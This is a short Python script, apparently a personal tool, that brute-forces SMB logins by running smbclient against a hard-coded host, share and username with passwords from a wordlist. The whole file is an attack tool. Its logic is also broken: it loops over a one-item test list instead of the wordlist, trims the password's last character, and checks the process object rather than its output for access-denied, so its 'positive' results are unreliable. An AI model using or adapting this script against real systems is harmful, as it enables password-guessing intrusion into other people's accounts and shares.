#!/usr/bin/python3
import sys, os, time
from subprocess import run


NETWORK_NAME="192.168.99.51"
SHARE_NAME="print$"

USER="thomas"
USER_FILE=""
PW=""
PW_FILE="/home/dks/HDD/wordlist/passwordlist.txt"
TEST_PW = ["pass"]

def Help():
    print("smbclient bruteforcer by dks...")

def ReadPW():
    l = []

    with open(PW_FILE, "r") as f:
        for line in f:
            l.append(line)
            
    return l
        
def main():
    positive = []
    
    #if(sys.argv[1] in ["-h", "--help"]):
    Help()

    pw_list = ReadPW()
    for pw in TEST_PW:
        #command = "smbclient \\\\%s\\%s -U %s %s" % (NETWORK_NAME,SHARE_NAME,USER,pw[:-1])
        command = ["smbclient", "\\\\%s\\%s" % (NETWORK_NAME, SHARE_NAME), "-U", USER, pw[:-1]]
        print("Trying %s:%s" % (USER, pw))
        result = run(command)
        if "NT_STATUS_ACCESS_DENIED" not in str(result):
            print("Positive: %s" % (USER+":"+pw))
            positive.append(USER+":"+pw)
            #break



if __name__=="__main__":
    main()
